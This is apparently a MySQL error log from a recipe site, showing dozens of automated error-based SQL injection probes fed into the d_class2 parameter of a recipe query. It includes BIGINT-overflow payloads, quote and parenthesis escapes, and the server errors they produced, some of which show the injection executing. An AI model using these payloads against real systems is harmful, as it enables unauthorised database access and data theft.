+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT 'gwjT' WHERE 5468=5468 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT AZsr WHERE 5389=5389 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT AZsr WHERE 5389=5389 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'NzPH' WHERE 6707=6707 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCA' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'NzPH' WHERE 6707=6707 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'CReQ' FROM DUAL WHERE 3836=3836 AND (SELECT 2*(IF((SELECT * FROM (SE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'CReQ' FROM DUAL WHERE 3836=3836 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" WHERE 8162=8162 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" WHERE 8162=8162 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- yzhs=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' WHERE 1239=1239 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' WHERE 1239=1239 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- UNis=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") WHERE 8591=8591 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") WHERE 8591=8591 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- UkNn=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') WHERE 8101=8101 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') WHERE 8101=8101 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- MuZh=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND "ylRX" LIKE "ylRX=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((("XsCg" LIKE "XsCg=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(29' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (("jEsb" LIKE "jEsb=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(299' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ("mmfL" LIKE "mmfL=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND "AANU"="AANU=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((("wgeh"="wgeh=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(29' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (("oNjV"="oNjV=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(299' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ("dpYr"="dpYr=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'ujdL' LIKE 'ujdL=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((('DXEe' LIKE 'DXEe=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(29' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (('iNTO' LIKE 'iNTO=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(299' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ('QsQH' LIKE 'QsQH=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'smoL'='smoL=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((('zCiP'='zCiP=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(29' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (('sjoe'='sjoe=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(299' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ('imnU'='imnU=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- nPcH=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- CBYw=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(299' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- zLBA=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`) WHERE 6118=6118 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4`) WHERE 6118=6118 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- pxnq=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '` WHERE 8155=8155 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4` WHERE 8155=8155 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- ppIr=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AS ykdh WHERE 6403=6403 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a62' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AS ykdh WHERE 6403=6403 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- Xxie=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS acyX WHERE 3152=3152 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AS acyX WHERE 3152=3152 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- SSKa=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 3465=3465 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 WHERE 3465=3465 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- seIH=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 7969=7969 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) WHERE 7969=7969 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- uJFN=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))# tcvQ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- neqD=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:35
+SQLSTATE[22003]: Numeric value out of range: 1690 BIGINT value is out of range in '(2 * if((select `s`.`CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78)` from (select concat(0x716a627871,(select elt((2993 = 2993),1)),0x717a766b71,0x78) AS `CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78)`) `s`),8446744073709551610,8446744073709551610))'
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(299' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((7591=7591=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((7772=7772=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:34
+SQLSTATE[22003]: Numeric value out of range: 1690 BIGINT value is out of range in '(2 * if((select `s`.`CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78)` from (select concat(0x716a627871,(select elt((2993 = 2993),1)),0x717a766b71,0x78) AS `CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78)`) `s`),8446744073709551610,8446744073709551610))'
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (5412=5412=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:34
+SQLSTATE[22003]: Numeric value out of range: 1690 BIGINT value is out of range in '(2 * if((select `s`.`CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78)` from (select concat(0x716a627871,(select elt((2993 = 2993),1)),0x717a766b71,0x78) AS `CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78)`) `s`),8446744073709551610,8446744073709551610))'
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- ZCKl=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''elKIap<'">zSPuMb=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'elKIap<'">zSPuMb=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''",(,''.")=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'",(,''.")=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
